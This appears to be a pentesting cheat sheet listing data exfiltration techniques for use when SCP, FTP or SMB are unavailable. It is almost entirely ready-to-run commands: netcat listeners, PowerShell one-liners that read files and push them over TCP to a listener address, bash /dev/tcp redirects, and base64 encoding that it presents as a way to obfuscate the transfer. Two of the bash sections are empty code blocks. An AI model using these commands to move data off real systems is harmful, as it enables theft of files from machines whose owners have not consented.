# Data Exfiltration Techniques
#### This is a list of some data exfiltration techniques if you don't have access to SCP, FTP, SMB, etc.

***
***

### Windows To Linux

#### Send file from remote client to host machine:

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:

```
nc -lp %ListeningPort% > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Windows host run the following in PowerShell:

```
$FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()
```
###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:

```
nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Windows host run the following in PowerShell:

```
$FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close()
```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.



***
***

### Linux To Linux

#### Send file from remote client to host machine:

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:

```
nc -lp port > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:

```
nc -q 0 %ListenerAddress% %ListeningPort% < /path/to/sending/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:

```
cat /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
```

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:

```
nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:

```
base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:

```
base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
```

***

#### Retrieve file from host to client:

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:

```
nc -q 0 -lp %ListenerPort% < /path/to/sending/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:

```

```

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:

```
base64 -w0 /path/to/sending/file.ext | nc -q 0 -lp %ListeningPort%
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:

```

```
